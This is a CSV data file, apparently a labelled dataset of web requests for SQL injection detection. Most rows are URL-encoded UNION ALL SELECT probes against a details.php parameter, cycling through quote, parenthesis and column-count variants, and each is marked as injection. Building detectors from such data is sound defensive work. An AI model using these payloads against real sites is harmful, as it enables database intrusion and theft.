full_url,event_time,hostname,injection
/details.php?prod=5&type=-1704%20UNION%20ALL%20SELECT%207711%2C7711%2C7711%2C7711%23,1681395163.903563,192.168.43.6,1
/details.php?prod=5&type=-6230%20UNION%20ALL%20SELECT%208228%2C8228%2C8228%2C8228%2C8228%23,1681395163.907218,192.168.43.6,1
/details.php?prod=5&type=-7333%20UNION%20ALL%20SELECT%207409%2C7409%2C7409%2C7409%2C7409%2C7409%23,1681395163.911343,192.168.43.6,1
/details.php?prod=5&type=-1911%20UNION%20ALL%20SELECT%208838%2C8838%2C8838%2C8838%2C8838%2C8838%2C8838%23,1681395163.915437,192.168.43.6,1
/details.php?prod=5&type=-8963%20UNION%20ALL%20SELECT%209482%2C9482%2C9482%2C9482%2C9482%2C9482%2C9482%2C9482%23,1681395163.919134,192.168.43.6,1
/details.php?prod=5&type=-8206%20UNION%20ALL%20SELECT%209656%2C9656%2C9656%2C9656%2C9656%2C9656%2C9656%2C9656%2C9656%23,1681395163.923498,192.168.43.6,1
/details.php?prod=5&type=-7867%20UNION%20ALL%20SELECT%208105%2C8105%2C8105%2C8105%2C8105%2C8105%2C8105%2C8105%2C8105%2C8105%23,1681395163.927408,192.168.43.6,1
/details.php?prod=5&type=-9761%27%20UNION%20ALL%20SELECT%202349%23,1681395163.931181,192.168.43.6,1
/details.php?prod=5&type=-6241%27%20UNION%20ALL%20SELECT%202343%2C2343%23,1681395163.935398,192.168.43.6,1
/details.php?prod=5&type=-4894%27%20UNION%20ALL%20SELECT%205088%2C5088%2C5088%23,1681395163.939359,192.168.43.6,1
/details.php?prod=5&type=-2786%27%20UNION%20ALL%20SELECT%208252%2C8252%2C8252%2C8252%23,1681395163.942923,192.168.43.6,1
/details.php?prod=5&type=-2331%27%20UNION%20ALL%20SELECT%201321%2C1321%2C1321%2C1321%2C1321%23,1681395163.947002,192.168.43.6,1
/details.php?prod=5&type=-3933%27%20UNION%20ALL%20SELECT%205586%2C5586%2C5586%2C5586%2C5586%2C5586%23,1681395163.951227,192.168.43.6,1
/details.php?prod=5&type=-1602%27%20UNION%20ALL%20SELECT%209333%2C9333%2C9333%2C9333%2C9333%2C9333%2C9333%23,1681395163.954868,192.168.43.6,1
/details.php?prod=5&type=-3881%27%20UNION%20ALL%20SELECT%207041%2C7041%2C7041%2C7041%2C7041%2C7041%2C7041%2C7041%23,1681395163.961981,192.168.43.6,1
/details.php?prod=5&type=-8001%27%20UNION%20ALL%20SELECT%202423%2C2423%2C2423%2C2423%2C2423%2C2423%2C2423%2C2423%2C2423%23,1681395163.965765,192.168.43.6,1
/details.php?prod=5&type=-9947%27%20UNION%20ALL%20SELECT%205343%2C5343%2C5343%2C5343%2C5343%2C5343%2C5343%2C5343%2C5343%2C5343%23,1681395163.970367,192.168.43.6,1
/details.php?prod=5&type=-4093%27%29%29%20AS%20eeWN%20WHERE%203447%3D3447%20UNION%20ALL%20SELECT%203447%23,1681395163.974949,192.168.43.6,1
/details.php?prod=5&type=-7569%27%29%29%20AS%20yTEu%20WHERE%204676%3D4676%20UNION%20ALL%20SELECT%204676%2C4676%23,1681395163.978679,192.168.43.6,1
/details.php?prod=5&type=-2133%27%29%29%20AS%20BNun%20WHERE%208043%3D8043%20UNION%20ALL%20SELECT%208043%2C8043%2C8043%23,1681395163.982811,192.168.43.6,1
/details.php?prod=5&type=-2816%27%29%29%20AS%20rOdp%20WHERE%204318%3D4318%20UNION%20ALL%20SELECT%204318%2C4318%2C4318%2C4318%23,1681395163.987014,192.168.43.6,1
/details.php?prod=5&type=-2150%27%29%29%20AS%20athc%20WHERE%206686%3D6686%20UNION%20ALL%20SELECT%206686%2C6686%2C6686%2C6686%2C6686%23,1681395163.990649,192.168.43.6,1
/details.php?prod=5&type=-5347%27%29%29%20AS%20kJLu%20WHERE%209028%3D9028%20UNION%20ALL%20SELECT%209028%2C9028%2C9028%2C9028%2C9028%2C9028%23,1681395163.994984,192.168.43.6,1
/details.php?prod=5&type=-7167%27%29%29%20AS%20dFij%20WHERE%202701%3D2701%20UNION%20ALL%20SELECT%202701%2C2701%2C2701%2C2701%2C2701%2C2701%2C2701%23,1681395164.001624,192.168.43.6,1
/details.php?prod=5&type=-7537%27%29%29%20AS%20MAkO%20WHERE%209970%3D9970%20UNION%20ALL%20SELECT%209970%2C9970%2C9970%2C9970%2C9970%2C9970%2C9970%2C9970%23,1681395164.005399,192.168.43.6,1
/details.php?prod=5&type=-6268%27%29%29%20AS%20rjBF%20WHERE%205892%3D5892%20UNION%20ALL%20SELECT%205892%2C5892%2C5892%2C5892%2C5892%2C5892%2C5892%2C5892%2C5892%23,1681395164.069088,192.168.43.6,1
/details.php?prod=5&type=-4467%27%29%29%20AS%20AdCe%20WHERE%207209%3D7209%20UNION%20ALL%20SELECT%207209%2C7209%2C7209%2C7209%2C7209%2C7209%2C7209%2C7209%2C7209%2C7209%23,1681395164.073472,192.168.43.6,1
/details.php?prod=5&type=-5897%22%29%29%20AS%20UwtB%20WHERE%206002%3D6002%20UNION%20ALL%20SELECT%206002%23,1681395164.077831,192.168.43.6,1
/details.php?prod=5&type=-9572%22%29%29%20AS%20EKWi%20WHERE%202617%3D2617%20UNION%20ALL%20SELECT%202617%2C2617%23,1681395164.081933,192.168.43.6,1
/details.php?prod=5&type=-3583%22%29%29%20AS%20cBFj%20WHERE%204099%3D4099%20UNION%20ALL%20SELECT%204099%2C4099%2C4099%23,1681395164.085946,192.168.43.6,1
/details.php?prod=5&type=-3691%22%29%29%20AS%20wJWF%20WHERE%209824%3D9824%20UNION%20ALL%20SELECT%209824%2C9824%2C9824%2C9824%23,1681395164.090161,192.168.43.6,1
/details.php?prod=5&type=-6952%22%29%29%20AS%20waKi%20WHERE%206354%3D6354%20UNION%20ALL%20SELECT%206354%2C6354%2C6354%2C6354%2C6354%23,1681395164.094387,192.168.43.6,1
/details.php?prod=5&type=-4570%22%29%29%20AS%20YuHj%20WHERE%207665%3D7665%20UNION%20ALL%20SELECT%207665%2C7665%2C7665%2C7665%2C7665%2C7665%23,1681395164.098242,192.168.43.6,1
/details.php?prod=5&type=-6999%22%29%29%20AS%20CQWH%20WHERE%202531%3D2531%20UNION%20ALL%20SELECT%202531%2C2531%2C2531%2C2531%2C2531%2C2531%2C2531%23,1681395164.10445,192.168.43.6,1
/details.php?prod=5&type=-2658%22%29%29%20AS%20oNxB%20WHERE%206167%3D6167%20UNION%20ALL%20SELECT%206167%2C6167%2C6167%2C6167%2C6167%2C6167%2C6167%2C6167%23,1681395164.108324,192.168.43.6,1
/details.php?prod=5&type=-8783%22%29%29%20AS%20IwKP%20WHERE%205178%3D5178%20UNION%20ALL%20SELECT%205178%2C5178%2C5178%2C5178%2C5178%2C5178%2C5178%2C5178%2C5178%23,1681395164.112916,192.168.43.6,1
/details.php?prod=5&type=-9968%22%29%29%20AS%20daqR%20WHERE%202032%3D2032%20UNION%20ALL%20SELECT%202032%2C2032%2C2032%2C2032%2C2032%2C2032%2C2032%2C2032%2C2032%2C2032%23,1681395164.117069,192.168.43.6,1
/details.php?prod=5&type=-5464%29%29%20AS%20ZSSF%20WHERE%204139%3D4139%20UNION%20ALL%20SELECT%204139%23,1681395164.121587,192.168.43.6,1
/details.php?prod=5&type=-8997%29%29%20AS%20Qxby%20WHERE%206967%3D6967%20UNION%20ALL%20SELECT%206967%2C6967%23,1681395164.126383,192.168.43.6,1
/details.php?prod=5&type=-8699%29%29%20AS%20WmjI%20WHERE%201380%3D1380%20UNION%20ALL%20SELECT%201380%2C1380%2C1380%23,1681395164.130616,192.168.43.6,1
/details.php?prod=5&type=-5540%29%29%20AS%20vSrO%20WHERE%208769%3D8769%20UNION%20ALL%20SELECT%208769%2C8769%2C8769%2C8769%23,1681395164.136559,192.168.43.6,1
/details.php?prod=5&type=-9732%29%29%20AS%20FuZr%20WHERE%205489%3D5489%20UNION%20ALL%20SELECT%205489%2C5489%2C5489%2C5489%2C5489%23,1681395164.140763,192.168.43.6,1
/details.php?prod=5&type=-2215%29%29%20AS%20Nqgs%20WHERE%205609%3D5609%20UNION%20ALL%20SELECT%205609%2C5609%2C5609%2C5609%2C5609%2C5609%23,1681395164.1444,192.168.43.6,1
/details.php?prod=5&type=-5390%29%29%20AS%20sbUD%20WHERE%201753%3D1753%20UNION%20ALL%20SELECT%201753%2C1753%2C1753%2C1753%2C1753%2C1753%2C1753%23,1681395164.149028,192.168.43.6,1
/details.php?prod=5&type=-6872%29%29%20AS%20AHGe%20WHERE%206383%3D6383%20UNION%20ALL%20SELECT%206383%2C6383%2C6383%2C6383%2C6383%2C6383%2C6383%2C6383%23,1681395164.154393,192.168.43.6,1
/details.php?prod=5&type=-5777%29%29%20AS%20cIGp%20WHERE%202679%3D2679%20UNION%20ALL%20SELECT%202679%2C2679%2C2679%2C2679%2C2679%2C2679%2C2679%2C2679%2C2679%23,1681395164.158139,192.168.43.6,1
/details.php?prod=5&type=-2563%29%29%20AS%20ahzX%20WHERE%204189%3D4189%20UNION%20ALL%20SELECT%204189%2C4189%2C4189%2C4189%2C4189%2C4189%2C4189%2C4189%2C4189%2C4189%23,1681395164.162474,192.168.43.6,1
/details.php?prod=5&type=-8081%27%29%20AS%20lhCq%20WHERE%207077%3D7077%20UNION%20ALL%20SELECT%207077%23,1681395164.166965,192.168.43.6,1
/details.php?prod=5&type=-4290%27%29%20AS%20SNcX%20WHERE%209571%3D9571%20UNION%20ALL%20SELECT%209571%2C9571%23,1681395164.170648,192.168.43.6,1
/details.php?prod=5&type=-7326%27%29%20AS%20PXQt%20WHERE%205982%3D5982%20UNION%20ALL%20SELECT%205982%2C5982%2C5982%23,1681395164.175157,192.168.43.6,1
/details.php?prod=5&type=-4017%27%29%20AS%20fWoi%20WHERE%208783%3D8783%20UNION%20ALL%20SELECT%208783%2C8783%2C8783%2C8783%23,1681395164.17958,192.168.43.6,1
/details.php?prod=5&type=-2879%27%29%20AS%20vySV%20WHERE%208636%3D8636%20UNION%20ALL%20SELECT%208636%2C8636%2C8636%2C8636%2C8636%23,1681395164.183796,192.168.43.6,1
/details.php?prod=5&type=-2732%27%29%20AS%20smDV%20WHERE%207320%3D7320%20UNION%20ALL%20SELECT%207320%2C7320%2C7320%2C7320%2C7320%2C7320%23,1681395164.187977,192.168.43.6,1
/details.php?prod=5&type=-9192%27%29%20AS%20cYRM%20WHERE%208936%3D8936%20UNION%20ALL%20SELECT%208936%2C8936%2C8936%2C8936%2C8936%2C8936%2C8936%23,1681395164.192669,192.168.43.6,1
/details.php?prod=5&type=-7147%27%29%20AS%20oLzl%20WHERE%204474%3D4474%20UNION%20ALL%20SELECT%204474%2C4474%2C4474%2C4474%2C4474%2C4474%2C4474%2C4474%23,1681395164.196218,192.168.43.6,1
/details.php?prod=5&type=-9316%27%29%20AS%20SbSI%20WHERE%202917%3D2917%20UNION%20ALL%20SELECT%202917%2C2917%2C2917%2C2917%2C2917%2C2917%2C2917%2C2917%2C2917%23,1681395164.200247,192.168.43.6,1
/details.php?prod=5&type=-2506%27%29%20AS%20UDRg%20WHERE%208650%3D8650%20UNION%20ALL%20SELECT%208650%2C8650%2C8650%2C8650%2C8650%2C8650%2C8650%2C8650%2C8650%2C8650%23,1681395164.204678,192.168.43.6,1
/details.php?prod=5&type=-1792%22%29%20AS%20gMyk%20WHERE%203203%3D3203%20UNION%20ALL%20SELECT%203203%23,1681395164.208346,192.168.43.6,1
/details.php?prod=5&type=-2625%22%29%20AS%20rtUz%20WHERE%208920%3D8920%20UNION%20ALL%20SELECT%208920%2C8920%23,1681395164.21247,192.168.43.6,1
/details.php?prod=5&type=-1440%22%29%20AS%20DFII%20WHERE%207087%3D7087%20UNION%20ALL%20SELECT%207087%2C7087%2C7087%23,1681395164.216497,192.168.43.6,1
/details.php?prod=5&type=-2371%22%29%20AS%20hzGW%20WHERE%209399%3D9399%20UNION%20ALL%20SELECT%209399%2C9399%2C9399%2C9399%23,1681395164.220209,192.168.43.6,1
/details.php?prod=5&type=-9976%22%29%20AS%20Clte%20WHERE%204563%3D4563%20UNION%20ALL%20SELECT%204563%2C4563%2C4563%2C4563%2C4563%23,1681395164.224581,192.168.43.6,1
/details.php?prod=5&type=-9015%22%29%20AS%20pVTW%20WHERE%209638%3D9638%20UNION%20ALL%20SELECT%209638%2C9638%2C9638%2C9638%2C9638%2C9638%23,1681395164.228566,192.168.43.6,1
/details.php?prod=5&type=-4504%22%29%20AS%20gSJQ%20WHERE%205046%3D5046%20UNION%20ALL%20SELECT%205046%2C5046%2C5046%2C5046%2C5046%2C5046%2C5046%23,1681395164.23297,192.168.43.6,1
/details.php?prod=5&type=-6278%22%29%20AS%20JgyH%20WHERE%202048%3D2048%20UNION%20ALL%20SELECT%202048%2C2048%2C2048%2C2048%2C2048%2C2048%2C2048%2C2048%23,1681395164.237239,192.168.43.6,1
/details.php?prod=5&type=-9439%22%29%20AS%20kYih%20WHERE%201914%3D1914%20UNION%20ALL%20SELECT%201914%2C1914%2C1914%2C1914%2C1914%2C1914%2C1914%2C1914%2C1914%23,1681395164.241399,192.168.43.6,1
/details.php?prod=5&type=-2212%22%29%20AS%20yaWH%20WHERE%201885%3D1885%20UNION%20ALL%20SELECT%201885%2C1885%2C1885%2C1885%2C1885%2C1885%2C1885%2C1885%2C1885%2C1885%23,1681395164.244954,192.168.43.6,1
/details.php?prod=5&type=-8157%29%20AS%20pbyw%20WHERE%205851%3D5851%20UNION%20ALL%20SELECT%205851%23,1681395164.249155,192.168.43.6,1
/details.php?prod=5&type=-1463%29%20AS%20vMPx%20WHERE%203244%3D3244%20UNION%20ALL%20SELECT%203244%2C3244%23,1681395164.253519,192.168.43.6,1
/details.php?prod=5&type=-9573%29%20AS%20OLei%20WHERE%205278%3D5278%20UNION%20ALL%20SELECT%205278%2C5278%2C5278%23,1681395164.257048,192.168.43.6,1
/details.php?prod=5&type=-9426%29%20AS%20imga%20WHERE%207452%3D7452%20UNION%20ALL%20SELECT%207452%2C7452%2C7452%2C7452%23,1681395164.261195,192.168.43.6,1
/details.php?prod=5&type=-4682%29%20AS%20xWTl%20WHERE%207127%3D7127%20UNION%20ALL%20SELECT%207127%2C7127%2C7127%2C7127%2C7127%23,1681395164.265328,192.168.43.6,1
/details.php?prod=5&type=-9397%29%20AS%20vJuI%20WHERE%209712%3D9712%20UNION%20ALL%20SELECT%209712%2C9712%2C9712%2C9712%2C9712%2C9712%23,1681395164.268999,192.168.43.6,1
/details.php?prod=5&type=-3411%29%20AS%20dUEx%20WHERE%205224%3D5224%20UNION%20ALL%20SELECT%205224%2C5224%2C5224%2C5224%2C5224%2C5224%2C5224%23,1681395164.273646,192.168.43.6,1
/details.php?prod=5&type=-8215%29%20AS%20CQsw%20WHERE%203051%3D3051%20UNION%20ALL%20SELECT%203051%2C3051%2C3051%2C3051%2C3051%2C3051%2C3051%2C3051%23,1681395164.277755,192.168.43.6,1
/details.php?prod=5&type=-5629%29%20AS%20mXcg%20WHERE%203793%3D3793%20UNION%20ALL%20SELECT%203793%2C3793%2C3793%2C3793%2C3793%2C3793%2C3793%2C3793%2C3793%23,1681395164.281354,192.168.43.6,1
/details.php?prod=5&type=-9608%29%20AS%20DeZU%20WHERE%208892%3D8892%20UNION%20ALL%20SELECT%208892%2C8892%2C8892%2C8892%2C8892%2C8892%2C8892%2C8892%2C8892%2C8892%23,1681395164.285707,192.168.43.6,1
/details.php?prod=5&type=-6966%60%20WHERE%204474%3D4474%20UNION%20ALL%20SELECT%204474%23,1681395164.290015,192.168.43.6,1
/details.php?prod=5&type=-4933%60%20WHERE%204047%3D4047%20UNION%20ALL%20SELECT%204047%2C4047%23,1681395164.293711,192.168.43.6,1
/details.php?prod=5&type=-9668%60%20WHERE%201268%3D1268%20UNION%20ALL%20SELECT%201268%2C1268%2C1268%23,1681395164.301096,192.168.43.6,1
/details.php?prod=5&type=-3457%60%20WHERE%204145%3D4145%20UNION%20ALL%20SELECT%204145%2C4145%2C4145%2C4145%23,1681395164.30481,192.168.43.6,1
/details.php?prod=5&type=-6317%60%20WHERE%204407%3D4407%20UNION%20ALL%20SELECT%204407%2C4407%2C4407%2C4407%2C4407%23,1681395164.308774,192.168.43.6,1
/details.php?prod=5&type=-7426%60%20WHERE%203482%3D3482%20UNION%20ALL%20SELECT%203482%2C3482%2C3482%2C3482%2C3482%2C3482%23,1681395164.312709,192.168.43.6,1
/details.php?prod=5&type=-1207%60%20WHERE%204186%3D4186%20UNION%20ALL%20SELECT%204186%2C4186%2C4186%2C4186%2C4186%2C4186%2C4186%23,1681395164.316396,192.168.43.6,1
/details.php?prod=5&type=-4999%60%20WHERE%204670%3D4670%20UNION%20ALL%20SELECT%204670%2C4670%2C4670%2C4670%2C4670%2C4670%2C4670%2C4670%23,1681395164.32062,192.168.43.6,1
/details.php?prod=5&type=-8702%60%20WHERE%205261%3D5261%20UNION%20ALL%20SELECT%205261%2C5261%2C5261%2C5261%2C5261%2C5261%2C5261%2C5261%2C5261%23,1681395164.32485,192.168.43.6,1
/details.php?prod=5&type=-4596%60%20WHERE%206029%3D6029%20UNION%20ALL%20SELECT%206029%2C6029%2C6029%2C6029%2C6029%2C6029%2C6029%2C6029%2C6029%2C6029%23,1681395164.328625,192.168.43.6,1
/details.php?prod=5&type=-1248%60%29%20WHERE%209489%3D9489%20UNION%20ALL%20SELECT%209489%23,1681395164.333052,192.168.43.6,1
/details.php?prod=5&type=-9111%60%29%20WHERE%206155%3D6155%20UNION%20ALL%20SELECT%206155%2C6155%23,1681395164.33722,192.168.43.6,1
/details.php?prod=5&type=-4631%60%29%20WHERE%207743%3D7743%20UNION%20ALL%20SELECT%207743%2C7743%2C7743%23,1681395164.340685,192.168.43.6,1
/details.php?prod=5&type=-9567%60%29%20WHERE%209609%3D9609%20UNION%20ALL%20SELECT%209609%2C9609%2C9609%2C9609%23,1681395164.344876,192.168.43.6,1
/details.php?prod=5&type=-5781%60%29%20WHERE%205361%3D5361%20UNION%20ALL%20SELECT%205361%2C5361%2C5361%2C5361%2C5361%23,1681395164.349841,192.168.43.6,1
/details.php?prod=5&type=-3768%60%29%20WHERE%205617%3D5617%20UNION%20ALL%20SELECT%205617%2C5617%2C5617%2C5617%2C5617%2C5617%23,1681395164.353858,192.168.43.6,1
/details.php?prod=5&type=-9756%60%29%20WHERE%209245%3D9245%20UNION%20ALL%20SELECT%209245%2C9245%2C9245%2C9245%2C9245%2C9245%2C9245%23,1681395164.35797,192.168.43.6,1
/details.php?prod=5&type=-6873%60%29%20WHERE%207467%3D7467%20UNION%20ALL%20SELECT%207467%2C7467%2C7467%2C7467%2C7467%2C7467%2C7467%2C7467%23,1681395164.362374,192.168.43.6,1
/details.php?prod=5&type=-3303%60%29%20WHERE%201589%3D1589%20UNION%20ALL%20SELECT%201589%2C1589%2C1589%2C1589%2C1589%2C1589%2C1589%2C1589%2C1589%23,1681395164.36623,192.168.43.6,1
/details.php?prod=5&type=-1526%60%29%20WHERE%208112%3D8112%20UNION%20ALL%20SELECT%208112%2C8112%2C8112%2C8112%2C8112%2C8112%2C8112%2C8112%2C8112%2C8112%23,1681395164.370276,192.168.43.6,1
/details.php?prod=5&type=-7528%27%20IN%20BOOLEAN%20MODE%29%20UNION%20ALL%20SELECT%204288%23,1681395164.37471,192.168.43.6,1
/details.php?prod=5&type=-4067%27%20IN%20BOOLEAN%20MODE%29%20UNION%20ALL%20SELECT%202800%2C2800%23,1681395164.378582,192.168.43.6,1
/details.php?prod=5&type=-9775%27%20IN%20BOOLEAN%20MODE%29%20UNION%20ALL%20SELECT%201266%2C1266%2C1266%23,1681395164.382807,192.168.43.6,1
/details.php?prod=5&type=-5491%27%20IN%20BOOLEAN%20MODE%29%20UNION%20ALL%20SELECT%207650%2C7650%2C7650%2C7650%23,1681395164.38823,192.168.43.6,1
/details.php?prod=5&type=-6301%27%20IN%20BOOLEAN%20MODE%29%20UNION%20ALL%20SELECT%208912%2C8912%2C8912%2C8912%2C8912%23,1681395164.391903,192.168.43.6,1
/details.php?prod=5&type=-9891%27%20IN%20BOOLEAN%20MODE%29%20UNION%20ALL%20SELECT%203784%2C3784%2C3784%2C3784%2C3784%2C3784%23,1681395164.396233,192.168.43.6,1
/details.php?prod=5&type=-4853%27%20IN%20BOOLEAN%20MODE%29%20UNION%20ALL%20SELECT%201026%2C1026%2C1026%2C1026%2C1026%2C1026%2C1026%23,1681395164.400356,192.168.43.6,1
/details.php?prod=5&type=-7098%27%20IN%20BOOLEAN%20MODE%29%20UNION%20ALL%20SELECT%203911%2C3911%2C3911%2C3911%2C3911%2C3911%2C3911%2C3911%23,1681395164.40406,192.168.43.6,1
/details.php?prod=5&type=-4568%27%20IN%20BOOLEAN%20MODE%29%20UNION%20ALL%20SELECT%207138%2C7138%2C7138%2C7138%2C7138%2C7138%2C7138%2C7138%2C7138%23,1681395164.408094,192.168.43.6,1
/details.php?prod=5&type=-2236%27%20IN%20BOOLEAN%20MODE%29%20UNION%20ALL%20SELECT%205179%2C5179%2C5179%2C5179%2C5179%2C5179%2C5179%2C5179%2C5179%2C5179%23,1681395164.412739,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395164.417701,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395164.422228,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395164.426525,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395164.538446,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395164.542941,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395164.597728,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395164.603695,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395164.60862,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395164.613498,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395164.675448,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395164.68018,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395164.687118,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395164.745275,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395164.752799,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395164.75755,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395164.762727,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395164.824368,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395164.831166,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395164.835734,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395164.895196,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395164.89923,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395164.904622,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395164.90861,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395164.913342,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395164.973939,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395164.978739,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395164.984778,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395164.989043,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395164.993279,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395164.997679,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395165.003512,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395165.011374,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395165.016078,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395165.020409,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395165.024928,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395165.029519,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395165.034233,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395165.039127,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395165.044202,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395165.048759,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395165.053168,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395165.057915,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395165.061924,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395165.066488,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395165.078931,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395165.083955,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395165.088093,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395165.093084,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395165.097162,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395165.10138,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395165.105583,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395165.110009,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395165.114409,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395165.11892,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395165.122675,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395165.127295,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395165.1318,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395165.136174,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395165.140243,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395165.144738,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395165.149552,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395165.154665,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395165.158962,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395165.163795,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395165.167563,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395165.172152,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395165.184354,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395165.189153,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395165.193206,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395165.197826,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395165.202895,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395165.208168,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395165.212795,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395165.279807,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395165.285998,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395165.290934,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395165.295058,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395165.299227,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395165.304823,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395165.309154,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395165.313596,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395165.318067,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395165.321457,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395165.325884,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395165.329874,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395165.335797,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395165.339874,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395165.343927,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395165.349256,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395165.354819,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395165.360196,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395165.365112,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395165.36903,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395165.374292,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395165.378394,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395165.383063,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395165.387394,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395165.39162,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395165.395933,192.168.43.6,1
